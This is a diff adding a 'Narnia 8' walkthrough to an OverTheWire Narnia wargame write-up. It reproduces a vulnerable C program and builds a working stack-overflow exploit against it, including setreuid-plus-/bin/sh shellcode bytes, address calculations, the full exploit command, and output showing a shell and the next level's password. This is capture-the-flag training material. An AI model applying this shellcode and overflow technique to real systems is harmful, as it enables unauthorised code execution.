@@ -691,3 +691,92 @@ Way to go!!!!$ cat /etc/narnia_pass/narnia8
 ```
 
 ![Get shell - Narnia 7](assets/narnia7.png)
+
+## Narnia 8
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+// gcc's variable reordering fucked things up
+// to keep the level in its old style i am
+// making "i" global until i find a fix
+// -morla
+int i;
+
+void func(char *b){
+	char *blah=b;
+	char bok[20];
+	//int i=0;
+
+	memset(bok, '\0', sizeof(bok));
+	for(i=0; blah[i] != '\0'; i++)
+		bok[i]=blah[i];
+
+	printf("%s\n",bok);
+}
+
+int main(int argc, char **argv){
+
+	if(argc > 1)
+		func(argv[1]);
+	else
+	printf("%s argument\n", argv[0]);
+
+	return 0;
+}
+```
+
+For this program, we can first pass in 20 `A`'s to get the stack address of
+`blah`, i.e., `b` or `argv[1]`.
+
+```bash
+$ /tmp/noenv /narnia/narnia8 AAAAAAAAAAAAAAAAAAAA | tail -c+21 | hexdump -n 4 -v -e '16/1 "%02x" "\n"'
+d3dfffff
+```
+
+So `argv[1]` will sit at `0xfffffdfd3`, and if we add one more character,
+the address of `argv[1]` will decrease by 1.
+
+Since the template of our exploit string is
+
+```bash
+AAAAAAAAAAAAAAAAAAAA + addr(argv[1]) + BBBB + 'addr(argv[1]) + 32' + shellcode(setreuid + sh)
+```
+
+And their lengths are listed below
+
+| Description        | Content      | Bytes         |
+|:------------------:|:------------:|:-------------:|
+| Padding 1          | 'A' * 20     | 20            |
+| addr(argv[1])      | `0x--------` | 4             |
+| Padding 2          | 'B' * 4      | 4             |
+| addr(argv[1]) + 32 | `0x--------` | 4             |
+| Shellcode          | `\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80` | 58 |
+
+We can calculate the start address of `argv[1]` by
+
+```python3
+>>> hex(0xffffdfd3 - 4 - 4 - 4 - 58)
+'0xffffdf8d'
+```
+
+and `addr(argv[1]) + 32` will be `0xffffdf8d + 32 = 0xffffdfad`
+
+Therefore, the final exploit string is:
+
+```bash
+$ /tmp/noenv /narnia/narnia8 'AAAAAAAAAAAAAAAAAAAA\x8d\xdf\xff\xffBBBB\xad\xdf\xff\xff\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80'
+[+] copying argv[0], len=15
+[+] copying argv[1], len=90
+[+] execute /narnia/narnia8
+AAAAAAAAAAAAAAAAAAAA����BBBB����j1X̀��jFX��̀jhh///sh/bin��h�4$ri1�QjY�Q��1�j
+                                                                          X̀��k
+                                                                              ځ{aH�
+$ cat /etc/narnia_pass/narnia9
+eRfb1uJaeO
+```
+
+![Get shell - Narnia 8](assets/narnia8.png)
+
+And now we have done all available narnia quizzes~ (as of writiing this post)
